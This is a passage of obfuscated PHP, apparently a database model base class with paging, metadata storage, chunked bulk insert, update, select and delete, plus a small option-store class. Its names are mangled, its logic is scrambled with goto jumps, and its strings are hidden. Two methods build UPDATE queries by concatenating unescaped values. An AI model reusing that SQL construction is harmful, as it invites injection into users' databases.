cacheKeyMake($E‹àø“ƒë, $C¾ãÈ„–¨¾) { $c¸™©’±‘´ =& $_SERVER[Î¿—”òá]; return get_class($this) . $c¸™©’±‘´[70] . $E‹àø“ƒë . $c¸™©’±‘´[348] . $C¾ãÈ„–¨¾; } protected function selectPage($Eóáªê­©Û = 200, $DíÍœ«¼ÀŠ = 1) { goto dùš¹ƒ¸Û; c™ÄÌ°Íò: $e¬ØÈÏ»˜ = intval($this->count()); $Eóáªê­©Û = intval($Eóáªê­©Û); $Eóáªê­©Û = $Eóáªê­©Û <= 5 ? 5 : ($Eóáªê­©Û >= $AĞ²à‘Œ–Œ ? $AĞ²à‘Œ–Œ : $Eóáªê­©Û); goto f«é‘„¥ê«; f«é‘„¥ê«: $Dé¼Ó‘åç‘ = ceil($e¬ØÈÏ»˜ / $Eóáªê­©Û); $DíÍœ«¼ÀŠ = intval(isset($in[$cé‘¬ª×¾[340]]) ? $in[$cé‘¬ª×¾[340]] : $DíÍœ«¼ÀŠ); $DíÍœ«¼ÀŠ = $DíÍœ«¼ÀŠ <= 1 ? 1 : ($DíÍœ«¼ÀŠ >= $Dé¼Ó‘åç‘ ? $Dé¼Ó‘åç‘ : $DíÍœ«¼ÀŠ); goto B÷÷›ÕÆô”; f®òƒ ùŠ: $AĞ²à‘Œ–Œ = 4000; $Eóáªê­©Û = isset($in[$cé‘¬ª×¾[349]]) ? $in[$cé‘¬ª×¾[349]] : $Eóáªê­©Û; if ($Eóáªê­©Û === -1) { unset($in[$cé‘¬ª×¾[349]]); $AĞ²à‘Œ–Œ = 100000000; $Eóáªê­©Û = $AĞ²à‘Œ–Œ; } goto Ağ™ƒ÷äá¥; f„ÜÙÉ³ÃÆ: if ($Dé¼Ó‘åç‘ == 1) { $e¬ØÈÏ»˜ = count($d¢‹¾éø…); } $C²ù‰Â£óâ = array($cé‘¬ª×¾[351] => array($cé‘¬ª×¾[352] => $e¬ØÈÏ»˜, $cé‘¬ª×¾[349] => $Eóáªê­©Û, $cé‘¬ª×¾[340] => $DíÍœ«¼ÀŠ, $cé‘¬ª×¾[353] => $Dé¼Ó‘åç‘), $cé‘¬ª×¾[354] => $d¢‹¾éø… ? $d¢‹¾éø… : array()); return $C²ù‰Â£óâ; goto F×Ä¬èã»™; dùš¹ƒ¸Û: $cé‘¬ª×¾ =& $_SERVER[Î¿—”òá]; global $in; $Dñµğî£ô = $this->optionsValue(); goto f®òƒ ùŠ; B÷÷›ÕÆô”: $this->optionsValue($Dñµğî£ô); $d¢‹¾éø… = $this->page($DíÍœ«¼ÀŠ, $Eóáªê­©Û)->select(); $d¢‹¾éø… = is_array($d¢‹¾éø…) ? $d¢‹¾éø… : array(); goto f„ÜÙÉ³ÃÆ; Ağ™ƒ÷äá¥: $b²Î’Ëš£ƒ = $Dñµğî£ô; $b²Î’Ëš£ƒ[$cé‘¬ª×¾[350]] = array(); $this->optionsValue($b²Î’Ëš£ƒ); goto c™ÄÌ°Íò; F×Ä¬èã»™: } protected function checkLength($b—©ª”ê‘, $F‡Í‹÷³œ§ = 0, $cÀ„îÚÕÛ = '') { $BÇ„‡ˆ©†× =& $_SERVER[Î¿—”òá]; $F‡Í‹÷³œ§ = $F‡Í‹÷³œ§ ? $F‡Í‹÷³œ§ : 65536; if (!$b—©ª”ê‘ || strlen($b—©ª”ê‘) < $F‡Í‹÷³œ§) { return; } $cÀ„îÚÕÛ = $cÀ„îÚÕÛ ? $cÀ„îÚÕÛ . $BÇ„‡ˆ©†×[67] : $BÇ„‡ˆ©†×[33]; show_json($cÀ„îÚÕÛ . LNG($BÇ„‡ˆ©†×[355]) . "\x28{$F‡Í‹÷³œ§}\51", !1); } protected function metaSet($F‘¦™ÍØ„ö, $B´äšö´ñ‹ = null, $B‘ÉÂğàÇ• = null) { goto bŠË õ±‰; cº´ˆ–µ³å: $a¨‰»ÎÆ‘¾ = $this->tableMeta[$a¶Î—‰á¼[357]]; $CàÜ—ÉÂ„ = Model($a¨‰»ÎÆ‘¾); $BÃ‘¤áâ…µ = array($d«Š™‰…ñà => $F‘¦™ÍØ„ö, $a¶Î—‰á¼[358] => $B´äšö´ñ‹); goto Dµ×ÜÏÈ°Ñ; bŠË õ±‰: $a¶Î—‰á¼ =& $_SERVER[Î¿—”òá]; if (!$this->tableMeta) { return !1; } $d«Š™‰…ñà = $this->tableMeta[$a¶Î—‰á¼[356]]; goto cº´ˆ–µ³å; Dµ×ÜÏÈ°Ñ: if (is_null($B´äšö´ñ‹)) { return $CàÜ—ÉÂ„->where(array($d«Š™‰…ñà => $F‘¦™ÍØ„ö))->delete(); } if (is_null($B‘ÉÂğàÇ•) && is_string($B´äšö´ñ‹)) { return $CàÜ—ÉÂ„->where($BÃ‘¤áâ…µ)->delete(); } $eŒ¢åËùÂæ = is_array($B´äšö´ñ‹) ? $B´äšö´ñ‹ : array(); goto bµéê™Ä¨; bµéê™Ä¨: if (is_string($B´äšö´ñ‹)) { $eŒ¢åËùÂæ[$B´äšö´ñ‹] = $B‘ÉÂğàÇ•; } $F—åøøŠ°¬ = array(); foreach ($eŒ¢åËùÂæ as $A¶§°¡÷† => $f¦Î¨ó±ğ„) { $this->checkLength($f¦Î¨ó±ğ„, !1, $a¨‰»ÎÆ‘¾ . $a¶Î—‰á¼[4] . $A¶§°¡÷†); $F—åøøŠ°¬[] = array($d«Š™‰…ñà => $F‘¦™ÍØ„ö, $a¶Î—‰á¼[89] => $A¶§°¡÷†, $a¶Î—‰á¼[359] => $f¦Î¨ó±ğ„); } goto BÙ§³ƒ¥ä; BÙ§³ƒ¥ä: $CàÜ—ÉÂ„->where(array($d«Š™‰…ñà => $F‘¦™ÍØ„ö))->addAll($F—åøøŠ°¬, array(), !0); return !0; goto F¢í»’íÎ£; F¢í»’íÎ£: } public function metaGet($cÄÇ­£«Ğº) { goto B²¨ò‡Ö—Ñ; Cíó§¶’Œ›: $fß·Ğõ»„Å = Model($this->tableMeta[$ašµ‹Á¸œ[357]]); $aïºæ ¬ì‚ = array($C«´œÏƒ³™ => $cÄÇ­£«Ğº); $E“ƒœ½õòì = $fß·Ğõ»„Å->field($ašµ‹Á¸œ[360])->where($aïºæ ¬ì‚)->select(); goto b£îƒòàØ; b£îƒòàØ: $E“ƒœ½õòì = array_to_keyvalue($E“ƒœ½õòì, $ašµ‹Á¸œ[89], $ašµ‹Á¸œ[359]); return $E“ƒœ½õòì; goto bØœ³„ØŞ; B²¨ò‡Ö—Ñ: $ašµ‹Á¸œ =& $_SERVER[Î¿—”òá]; if (!$this->tableMeta) { return array(); } $C«´œÏƒ³™ = $this->tableMeta[$ašµ‹Á¸œ[356]]; goto Cíó§¶’Œ›; bØœ³„ØŞ: } private function checkDataAutoHas($A–¡Š™Å) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $E‘ïèº¢£) { if (in_array($A–¡Š™Å, explode($_SERVER[Î¿—”òá][47], $E‘ïèº¢£[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$E®óŞğ‹, $bç½ ëÊñœ) { $aÏí‰Ë±‘‡ =& $_SERVER[Î¿—”òá]; foreach ($this->dataAuto as $c§¬à«ì÷µ) { $b›Œ©›Şµ‚ = $c§¬à«ì÷µ[0]; if (!in_array($bç½ ëÊñœ, explode($aÏí‰Ë±‘‡[47], $c§¬à«ì÷µ[2]))) { continue; } switch (trim($c§¬à«ì÷µ[3])) { case $aÏí‰Ë±‘‡[309]: case $aÏí‰Ë±‘‡[310]: $BøÆŞ—ñØ = $c§¬à«ì÷µ[1]; $f•£Œ¶´·Ş = isset($c§¬à«ì÷µ[4]) ? (array) $c§¬à«ì÷µ[4] : array(); if ($BøÆŞ—ñØ == $aÏí‰Ë±‘‡[190] && array_key_exists($b›Œ©›Şµ‚, $E®óŞğ‹)) { if (!$E®óŞğ‹[$b›Œ©›Şµ‚]) { unset($E®óŞğ‹[$b›Œ©›Şµ‚]); } break; } if (isset($E®óŞğ‹[$b›Œ©›Şµ‚])) { array_unshift($f•£Œ¶´·Ş, $E®óŞğ‹[$b›Œ©›Şµ‚]); } if ($aÏí‰Ë±‘‡[309] == $c§¬à«ì÷µ[3]) { $E®óŞğ‹[$b›Œ©›Şµ‚] = call_user_func_array($BøÆŞ—ñØ, $f•£Œ¶´·Ş); } else { $E®óŞğ‹[$b›Œ©›Şµ‚] = call_user_func_array(array(&$this, $BøÆŞ—ñØ), $f•£Œ¶´·Ş); } break; case $aÏí‰Ë±‘‡[261]: $E®óŞğ‹[$b›Œ©›Şµ‚] = $E®óŞğ‹[$c§¬à«ì÷µ[1]]; break; case $aÏí‰Ë±‘‡[282]: if (isset($E®óŞğ‹[$b›Œ©›Şµ‚]) && !is_string($E®óŞğ‹[$b›Œ©›Şµ‚])) { $E®óŞğ‹[$b›Œ©›Şµ‚] = json_encode_force($E®óŞğ‹[$b›Œ©›Şµ‚]); } break; case $aÏí‰Ë±‘‡[311]: if ($E®óŞğ‹[$b›Œ©›Şµ‚] === $aÏí‰Ë±‘‡[33]) { unset($E®óŞğ‹[$b›Œ©›Şµ‚]); } break; case $aÏí‰Ë±‘‡[312]: $E®óŞğ‹[$b›Œ©›Şµ‚] = $c§¬à«ì÷µ[1]; default: break; } } if ($bç½ ëÊñœ == $aÏí‰Ë±‘‡[344]) { $fÊö¹ïµ• = strtolower($this->db->getDbType()); if (strpos($fÊö¹ïµ•, $aÏí‰Ë±‘‡[9]) !== 0) { return; } $fçÈºÙºŒì = $this->field(!0)->fields; $d×ë†šŒî = $fçÈºÙºŒì[$aÏí‰Ë±‘‡[240]]; if (isset($fçÈºÙºŒì[$aÏí‰Ë±‘‡[239]])) { unset($d×ë†šŒî[$fçÈºÙºŒì[$aÏí‰Ë±‘‡[239]]]); } foreach ($d×ë†šŒî as $A¤‹˜ˆ¹Úñ => $bç½ ëÊñœ) { if (!isset($E®óŞğ‹[$A¤‹˜ˆ¹Úñ])) { $E®óŞğ‹[$A¤‹˜ˆ¹Úñ] = $aÏí‰Ë±‘‡[33]; } } } } private function dataAfterFilter(&$eĞ’«ï ­°) { $c¨¥‹‘å½· =& $_SERVER[Î¿—”òá]; foreach ($this->dataAuto as $d¨ùÓ‚ø) { $EøËï„¬÷› = $d¨ùÓ‚ø[0]; if (!in_array($c¨¥‹‘å½·[346], explode($c¨¥‹‘å½·[47], $d¨ùÓ‚ø[2]))) { continue; } if (!isset($eĞ’«ï ­°[$EøËï„¬÷›])) { continue; } switch (trim($d¨ùÓ‚ø[3])) { case $c¨¥‹‘å½·[309]: case $c¨¥‹‘å½·[310]: $dŞ˜Öã‡ = isset($d¨ùÓ‚ø[4]) ? (array) $d¨ùÓ‚ø[4] : array(); array_unshift($dŞ˜Öã‡, $eĞ’«ï ­°[$EøËï„¬÷›]); if ($c¨¥‹‘å½·[309] == $d¨ùÓ‚ø[3]) { $eĞ’«ï ­°[$EøËï„¬÷›] = call_user_func_array($d¨ùÓ‚ø[1], $dŞ˜Öã‡); } else { $eĞ’«ï ­°[$EøËï„¬÷›] = call_user_func_array(array(&$this, $d¨ùÓ‚ø[1]), $dŞ˜Öã‡); } break; case $c¨¥‹‘å½·[261]: $eĞ’«ï ­°[$EøËï„¬÷›] = $eĞ’«ï ­°[$d¨ùÓ‚ø[1]]; break; case $c¨¥‹‘å½·[282]: $D×¡é·¿š˜ = $eĞ’«ï ­°[$EøËï„¬÷›]; $eĞ’«ï ­°[$EøËï„¬÷›] = json_decode($D×¡é·¿š˜, !0); if (is_null($eĞ’«ï ­°[$EøËï„¬÷›])) { $eĞ’«ï ­°[$EøËï„¬÷›] = $D×¡é·¿š˜; } break; case $c¨¥‹‘å½·[311]: if ($eĞ’«ï ­°[$EøËï„¬÷›] === $c¨¥‹‘å½·[33]) { unset($eĞ’«ï ­°[$EøËï„¬÷›]); } break; case $c¨¥‹‘å½·[312]: $eĞ’«ï ­°[$EøËï„¬÷›] = $d¨ùÓ‚ø[1]; default: break; } } } public function saveAll($a¼¸¦È¿è§) { goto fáí²¸Ê¹µ; fáí²¸Ê¹µ: $Cˆ˜õÍ•¢ =& $_SERVER[Î¿—”òá]; $B†Ó‚Üöòé = $this->tablePrefix . $this->tableName; $B©´ˆ´Ê‚Ù = self::SQL_WHERE_IN_CHUNK; goto eÌ›Üİßƒ®; eÌ›Üİßƒ®: $a¼¸¦È¿è§ = is_array($a¼¸¦È¿è§) ? $a¼¸¦È¿è§ : array(); $bÜºƒïéÃÄ = $Cˆ˜õÍ•¢[361]; $E‘á¬°”¤… = 0; goto f˜ø–Ö‡î; f˜ø–Ö‡î: $B»”··æÅ” = array(); $f¼‡ŒôÈÒ = count($a¼¸¦È¿è§); for ($F¸¹¥“¸ğ = 0; $F¸¹¥“¸ğ < $f¼‡ŒôÈÒ; $F¸¹¥“¸ğ++) { $EßÕô¶«Ö¼ = $a¼¸¦È¿è§[$F¸¹¥“¸ğ]; if (!is_array($EßÕô¶«Ö¼) || count($EßÕô¶«Ö¼) != 4) { continue; } $Dã¾Æà‹¦ = "\x55\120\104\101\x54\105\x20\140{$B†Ó‚Üöòé}\140\x20\x53\105\x54\x20{$EßÕô¶«Ö¼[2]}\x20\x3d\x20\103\x41\x53\105\x20{$EßÕô¶«Ö¼[0]}\40\xa"; if ($E‘á¬°”¤… == 0) { $bÜºƒïéÃÄ = $Dã¾Æà‹¦; } $B»”··æÅ”[] = $Cˆ˜õÍ•¢[113] . $EßÕô¶«Ö¼[1] . $Cˆ˜õÍ•¢[113]; $E‘á¬°”¤…++; $bÜºƒïéÃÄ .= "\x20\127\x48\x45\x4e\x20\47{$EßÕô¶«Ö¼[1]}\x27\40\124\110\x45\116\40\47{$EßÕô¶«Ö¼[3]}\x27\x20\xa"; if ($E‘á¬°”¤… == $B©´ˆ´Ê‚Ù || $F¸¹¥“¸ğ == $f¼‡ŒôÈÒ - 1) { goto bˆ’ò†ÎÂ; bˆ’ò†ÎÂ: $dºáŠç£îã = implode($Cˆ˜õÍ•¢[47], $B»”··æÅ”); $bÜºƒïéÃÄ .= "\x20\x45\116\104\40\x20\127\110\105\x52\x45\40{$EßÕô¶«Ö¼[0]}\40\x49\x4e\x20\x28{$dºáŠç£îã}\x29\40"; $this->execute($bÜºƒïéÃÄ); goto a…ÅèÔß¥Ì; b‹‹·Š§»®: $B»”··æÅ” = array(); goto a‰ê•¡„ß¥; a…ÅèÔß¥Ì: $E‘á¬°”¤… = 0; $bÜºƒïéÃÄ = $Dã¾Æà‹¦; $this->chunkEventCheck(count($B»”··æÅ”)); goto b‹‹·Š§»®; a‰ê•¡„ß¥: } } goto bŒ¹«—¡Ğ¡; bŒ¹«—¡Ğ¡: $this->chunkEventSet(); goto cÄŒÒßœÌÜ; cÄŒÒßœÌÜ: } public function saveAllEach($Dã‘á´áø¬) { $Föë—„Ö‹¬ =& $_SERVER[Î¿—”òá]; $bËŸ•š¨ = $this->tablePrefix . $this->tableName; foreach ($Dã‘á´áø¬ as $EİñÓ¶ì†) { if (!is_array($EİñÓ¶ì†) || count($EİñÓ¶ì†) != 4) { continue; } $c¾ÉÙ à²¹ = $EİñÓ¶ì†[0] . $Föë—„Ö‹¬[362] . $EİñÓ¶ì†[1] . $Föë—„Ö‹¬[113]; $fä²ï¶øí = $EİñÓ¶ì†[2] . $Föë—„Ö‹¬[362] . $EİñÓ¶ì†[3] . $Föë—„Ö‹¬[113]; $Aãª‰ø·Ò° = "\x75\x70\144\141\x74\x65\40{$bËŸ•š¨}\x20\x73\x65\x74\40{$fä²ï¶øí}\x20\167\x68\145\x72\145\40{$c¾ÉÙ à²¹}\73"; $this->execute($Aãª‰ø·Ò°); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($FãÜ¾Êë = false, $D¹’å°¢Ğ“ = false) { $this->_chunkEvent = $FãÜ¾Êë; $this->_chunkEventParam = $D¹’å°¢Ğ“; } private function chunkEventCheck($Dù½Â¿õÍ¼) { if (!$this->_chunkEvent) { return; } $fÚ÷³ã¤ä† = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $fÚ÷³ã¤ä†[$_SERVER[Î¿—”òá][363]] = $Dù½Â¿õÍ¼; Hook::trigger($this->_chunkEvent, $fÚ÷³ã¤ä†); } public function addAll($eØƒ¿¡Ğõ«, $aÇÍ¤Á×» = array(), $aßæ« Ñ = false) { goto Bí‘§Ÿ‘¬¯; DÎÓÂ‘‘ŸÊ: if (method_exists($this->db, $eÓÃÂÀ˜‘[260])) { for ($F¬ÄÍğôºŸ = 0; $F¬ÄÍğôºŸ < count($eØƒ¿¡Ğõ«); $F¬ÄÍğôºŸ += $B¦ø¢âØìæ) { $F¬¤Äß = array_slice($eØƒ¿¡Ğõ«, $F¬ÄÍğôºŸ, $B¦ø¢âØìæ); if (!is_array($F¬¤Äß) || count($F¬¤Äß) == 0) { break; } $Aâ·¨‚œˆÓ = $this->db->insertAll($F¬¤Äß, $aÇÍ¤Á×», $aßæ« Ñ); $this->chunkEventCheck(count($F¬¤Äß)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($eØƒ¿¡Ğõ« as $fëí¡ÑİÜ§ => $eÏå½¯å­•) { $Aâ·¨‚œˆÓ = $this->db->insert($eÏå½¯å­•, $aÇÍ¤Á×», $aßæ« Ñ); } $this->commit(); } if (!1 !== $Aâ·¨‚œˆÓ) { $dÑ™ÇªÌê = $this->getLastInsID(); if ($dÑ™ÇªÌê) { return $dÑ™ÇªÌê; } } return $Aâ·¨‚œˆÓ; goto C»ô ­¤ê; D¶æí¡Ş: if (empty($eØƒ¿¡Ğõ«)) { $this->error = think_lang($eÓÃÂÀ˜‘[259]); return !1; } $aÇÍ¤Á×» = $this->_parseOptions($aÇÍ¤Á×»); foreach ($eØƒ¿¡Ğõ« as $fëí¡ÑİÜ§ => $eÏå½¯å­•) { $eØƒ¿¡Ğõ«[$fëí¡ÑİÜ§] = $this->_facade($eÏå½¯å­•); $this->_beforeInsert($eØƒ¿¡Ğõ«[$fëí¡ÑİÜ§], $aÇÍ¤Á×»); } goto DÎÓÂ‘‘ŸÊ; Bí‘§Ÿ‘¬¯: $eÓÃÂÀ˜‘ =& $_SERVER[Î¿—”òá]; ignore_timeout(); $B¦ø¢âØìæ = self::SQL_WHERE_IN_CHUNK; goto D¶æí¡Ş; C»ô ­¤ê: } public function save($C…‡á²ƒò = '', $eÁùµä…Š = array()) { goto aëåÖºÚ£Î; aëåÖºÚ£Î: $f­òŠ•æÃå =& $_SERVER[Î¿—”òá]; $a…ºß³ò¡Ê = self::SQL_WHERE_IN_CHUNK; $c‡Áæ‰‰¡³ = $this->optionsValue(); goto A”‘Ôª; a¹å¯‹Ôˆ‰: $EÃ‡ÖÖ¥íí = $c‡Áæ‰‰¡³[$f­òŠ•æÃå[263]][$CÂøóñÏ´][1]; $EÃ‡ÖÖ¥íí = is_array($EÃ‡ÖÖ¥íí) ? $EÃ‡ÖÖ¥íí : array(); $eœ†ÑŸÃ‰ = count($EÃ‡ÖÖ¥íí); goto dŒ‚à‚”¸Œ; A”‘Ôª: $CÂøóñÏ´ = $this->findWhereField($c‡Áæ‰‰¡³); if (!$CÂøóñÏ´) { return parent::save($C…‡á²ƒò, $eÁùµä…Š); } $dÏ½ˆÆÙ¬É = 0; goto a¹å¯‹Ôˆ‰; dŒ‚à‚”¸Œ: for ($e¬¥µÑ–ø = 0; $e¬¥µÑ–ø < $eœ†ÑŸÃ‰; $e¬¥µÑ–ø += $a…ºß³ò¡Ê) { $b„–œÚ›™Ó = array_slice($EÃ‡ÖÖ¥íí, $e¬¥µÑ–ø, $a…ºß³ò¡Ê); if (!is_array($b„–œÚ›™Ó) || count($b„–œÚ›™Ó) == 0) { break; } $c‡Áæ‰‰¡³[$f­òŠ•æÃå[263]][$CÂøóñÏ´][1] = $b„–œÚ›™Ó; $this->optionsValue($c‡Áæ‰‰¡³); $dÏ½ˆÆÙ¬É += parent::save($C…‡á²ƒò, $eÁùµä…Š); $this->chunkEventCheck(count($b„–œÚ›™Ó)); } $this->chunkEventSet(); return $dÏ½ˆÆÙ¬É; goto A­ÆµåëÕ; A­ÆµåëÕ: } public function add($fâ×¢ï«ì = '', $e©î¥Ğ£¿ = array(), $cË·½Öîİ¾ = false) { if ($this->addTaskStatus && is_array($fâ×¢ï«ì)) { $this->addTaskData[] = $fâ×¢ï«ì; return; } return parent::add($fâ×¢ï«ì, $e©î¥Ğ£¿, $cË·½Öîİ¾); } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($CòŞ¨åÛ² = array()) { goto B¸¾…¥ÏÚ…; F×Ù˜Ó˜Ò›: $fÎÊÒ’ = is_array($fÎÊÒ’) ? $fÎÊÒ’ : array(); $aæÖ“‚óœ† = null; for ($cİ¸¤†ëŠë = 0; $cİ¸¤†ëŠë < count($fÎÊÒ’); $cİ¸¤†ëŠë += $Eì¢Ÿ­·¿Ø) { $A­ïÍàöƒˆ = array_slice($fÎÊÒ’, $cİ¸¤†ëŠë, $Eì¢Ÿ­·¿Ø); if (!is_array($A­ïÍàöƒˆ) || count($A­ïÍàöƒˆ) == 0) { break; } $Eìõ†ŸÄê[$A‡Ş¥Ãîö—[263]][$aß´Ôï¶¦Ò][1] = $A­ïÍàöƒˆ; $this->optionsValue($Eìõ†ŸÄê); $BòÉŠ’ÜÄ = parent::select($CòŞ¨åÛ²); if (!$BòÉŠ’ÜÄ) { continue; } if (is_null($aæÖ“‚óœ†)) { $aæÖ“‚óœ† = array(); } $aæÖ“‚óœ† = array_merge($aæÖ“‚óœ†, $BòÉŠ’ÜÄ); } goto bˆÔ¤®—¼¿; B¸¾…¥ÏÚ…: $A‡Ş¥Ãîö— =& $_SERVER[Î¿—”òá]; $Eì¢Ÿ­·¿Ø = self::SQL_WHERE_IN_CHUNK; $Eìõ†ŸÄê = $this->optionsValue(); goto C¿øÂäÄ»; C¿øÂäÄ»: $aß´Ôï¶¦Ò = $this->findWhereField($Eìõ†ŸÄê); if (!$aß´Ôï¶¦Ò || isset($Eìõ†ŸÄê[$A‡Ş¥Ãîö—[280]]) || isset($Eìõ†ŸÄê[$A‡Ş¥Ãîö—[340]])) { return parent::select($CòŞ¨åÛ²); } $fÎÊÒ’ = $Eìõ†ŸÄê[$A‡Ş¥Ãîö—[263]][$aß´Ôï¶¦Ò][1]; goto F×Ù˜Ó˜Ò›; bˆÔ¤®—¼¿: return $aæÖ“‚óœ†; goto D¿™¤é©çÑ; D¿™¤é©çÑ: } public function delete($dóäË´áÓ¸ = array()) { goto e ‰‰¢·Ô·; e ‰‰¢·Ô·: $aØñ”–Š‘É =& $_SERVER[Î¿—”òá]; $C¶»¬Œ½Ã = self::SQL_WHERE_IN_CHUNK; $f¾ŠâÙìØ = $this->optionsValue(); goto CâÊ¼Ñ°Ø; dÂÚ¹ÚÚ•ˆ: $AòÊÊéÕŸˆ = $f¾ŠâÙìØ[$aØñ”–Š‘É[263]][$CÓÏÉœ›ÃÙ][1]; $AòÊÊéÕŸˆ = is_array($AòÊÊéÕŸˆ) ? $AòÊÊéÕŸˆ : array(); for ($bÁö¥êøÈ¾ = 0; $bÁö¥êøÈ¾ < count($AòÊÊéÕŸˆ); $bÁö¥êøÈ¾ += $C¶»¬Œ½Ã) { $E¹ğßä¼ƒ = array_slice($AòÊÊéÕŸˆ, $bÁö¥êøÈ¾, $C¶»¬Œ½Ã); if (!is_array($E¹ğßä¼ƒ) || count($E¹ğßä¼ƒ) == 0) { break; } $f¾ŠâÙìØ[$aØñ”–Š‘É[263]][$CÓÏÉœ›ÃÙ][1] = $E¹ğßä¼ƒ; $this->optionsValue($f¾ŠâÙìØ); $D×§‹¸í += parent::delete($dóäË´áÓ¸); } goto FÆŞÒ„Ü˜Õ; FÆŞÒ„Ü˜Õ: return $D×§‹¸í; goto c†‡‰·µ; CâÊ¼Ñ°Ø: $CÓÏÉœ›ÃÙ = $this->findWhereField($f¾ŠâÙìØ); if (!$CÓÏÉœ›ÃÙ) { return parent::delete($dóäË´áÓ¸); } $D×§‹¸í = 0; goto dÂÚ¹ÚÚ•ˆ; c†‡‰·µ: } private function findWhereField($dó§”ƒÈÃ ) { $CôÔŠŞë¶Ú =& $_SERVER[Î¿—”òá]; $dÕÍ®ñÕÄç = self::SQL_WHERE_IN_CHUNK; if (!is_array($dó§”ƒÈÃ ) || !is_array($dó§”ƒÈÃ [$CôÔŠŞë¶Ú[263]])) { return !1; } foreach ($dó§”ƒÈÃ [$CôÔŠŞë¶Ú[263]] as $d­¹¡øµ‰æ => $fùŸîëè×†) { if (is_array($fùŸîëè×†) && isset($fùŸîëè×†[0]) && is_string($fùŸîëè×†[0]) && strtolower($fùŸîëè×†[0]) == $CôÔŠŞë¶Ú[7] && is_array($fùŸîëè×†[1]) && count($fùŸîëè×†[1]) > $dÕÍ®ñÕÄç) { ignore_timeout(); return $d­¹¡øµ‰æ; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\x79\x73\164\x65\x6d\117\x70\x74\151\x6f\x6e"; public $field = array(); public function listData($A ¦´™å• = false, $a¿ŸŸÒëğ = "\155\x6f\x64\151\x66\171\124\151\155\x65", $DŒŒ çªÆÕ = false) { $Bê«ÇœÎÏö = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$Bê«ÇœÎÏö) { return $A ¦´™å• ? null : array(); } if (!$A ¦´™å•) { $Bê«ÇœÎÏö = array_filter(array_values($Bê«ÇœÎÏö)); return array_sort_by($Bê«ÇœÎÏö, $a¿ŸŸÒëğ, $DŒŒ çªÆÕ); } return $Bê«ÇœÎÏö[$_SERVER[Î¿—”òá][364] . $A ¦´™å•]; } public function insert($e‹†³ˆºÄ‚) { goto døèñöÀ“£; døèñöÀ“£: $FƒéÊ—ñÖ =& $_SERVER[Î¿—”òá]; $e‹†³ˆºÄ‚ = array_field_key($e‹†³ˆºÄ‚, $this->field); $eŠ¹Øšàò = Model($this->modelType)->get($FƒéÊ—ñÖ[365], $this->optionType . $FƒéÊ—ñÖ[366]); goto fƒ£º÷Œ‹§; fƒ£º÷Œ‹§: $eŠ¹Øšàò = $eŠ¹Øšàò ? $eŠ¹Øšàò : 0; $e‹†³ˆºÄ‚[$FƒéÊ—ñÖ[367]] = ++$eŠ¹Øšàò; $e‹†³ˆºÄ‚[$FƒéÊ—ñÖ[187]] = time(); goto AÛ›¹„Öã†; AÛ›¹„Öã†: $e‹†³ˆºÄ‚[$FƒéÊ—ñÖ[107]] = time(); Model($this->modelType)->set($FƒéÊ—ñÖ[365], $eŠ¹Øšàò, $this->optionType . $FƒéÊ—ñÖ[366]); Model($this->modelType)->set($FƒéÊ—ñÖ[364] . $eŠ¹Øšàò, $e‹†³ˆºÄ‚, $this->optionType); goto cÕŒÔö»Îğ; cÕŒÔö»Îğ: return $eŠ¹Øšàò; goto aô—Ş²—¿×; aô—Ş²—¿×: } public function update($b‰¦„ã­®˜, $e„Ò ÒÀ›Ş) { goto D¼‚À«Ÿİì; D¼‚À«Ÿİì: $bÖ·‚ÕâĞ‰ =& $_SERVER[Î¿—”òá]; $e„Ò ÒÀ›Ş = array_field_key($e„Ò ÒÀ›Ş, $this->field); $Cì›ÃŸ¸‰’ = $this->listData($b‰¦„ã­®˜); goto fğÁ‚ÔÄÙ¢; C´ˆ±Åæ¾Û: return Model($this->modelType)->set($bÖ·‚ÕâĞ‰[364] . $b‰¦„ã­®˜, $e„Ò ÒÀ›Ş, $this->optionType); goto C¥Ò ïˆ¡’; fğÁ‚ÔÄÙ¢: if (!$Cì›ÃŸ¸‰’) { return !1; } $e„Ò ÒÀ›Ş = array_merge($Cì›ÃŸ¸‰’, $e„Ò ÒÀ›Ş); $e„Ò ÒÀ›Ş[$bÖ·‚ÕâĞ‰[107]] = time(); goto C´ˆ±Åæ¾Û; C¥Ò ïˆ¡’: } public function remove($DŠ¶×ˆ•Î) { return Model($this->modelType)->remove($_SERVER[Î¿—”òá][364] . $DŠ¶×ˆ•Î, $this->optionType); } public function clear() { $d´¢ùçÛ’÷ =& $_SERVER[Î¿—”òá]; Model($this->modelType)->remove($d´¢ùçÛ’÷[365], $this->optionType . $d´¢ùçÛ’÷[366]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($fÁñ’ëÓÓ, $f¿Æœ›¡¨é) { if (!$f¿Æœ›¡¨é) { return !1; } $CŠ¬Ë–»  = $this->listData(); $CŠ¬Ë–»  = array_to_keyvalue($CŠ¬Ë–» , $fÁñ’ëÓÓ); return isset($CŠ¬Ë–» [$f¿Æœ›¡¨é]) ? $CŠ¬Ë–» [$f¿Æœ›¡¨é] : !1; } public function findByName($aÕ˜êİé›ñ) { return $this->findByKey($_SERVER[Î¿—”òá][28], $aÕ˜êİé›ñ); } protected function resetData($CÜçŸŞ¦µ) { $f íĞ‰™êã =& $_SERVER[Î¿—”òá]; $CÜçŸŞ¦µ = is_array($CÜçŸŞ¦µ) ? $CÜçŸŞ¦µ : array(); $C±‹“ñæ„„ = array(); for ($C©º·ÍãÔÔ = 0; $C©º·ÍãÔÔ < count($CÜçŸŞ¦µ); $C©º·ÍãÔÔ++) { $C±‹“ñæ„„[$f íĞ‰™êã[364] . $CÜçŸŞ¦µ[$C©º·ÍãÔÔ][$f íĞ‰™êã[367]]] = $CÜçŸŞ¦µ[$C©º·ÍãÔÔ]; } return Model($this->modelType)->set($C±‹“ñæ„„, !1, $this->optionType); } private function getAutoName($a«±›ùœ) { $AÊçõ”¿–¾ = 